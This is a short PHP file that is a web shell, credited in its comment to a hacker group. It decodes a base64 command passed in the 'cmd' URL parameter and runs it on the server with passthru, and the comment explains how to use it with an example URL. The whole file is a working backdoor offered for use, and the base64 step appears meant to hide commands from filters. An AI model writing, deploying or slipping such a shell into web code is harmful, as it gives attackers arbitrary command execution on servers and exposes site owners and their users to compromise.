<?php

/*	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
 *
	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.

	Example:
	https://example.com/g.php?cmd=bHMK

	Note:
	The Command is strictly should be in base64 encryption to work :)

	(c) Wh1t3R0s3
-------------------------------------------------------------------------------------------------------------------------------
 */
echo passthru(base64_decode($_GET['cmd'])); _halt_compiler();
?>
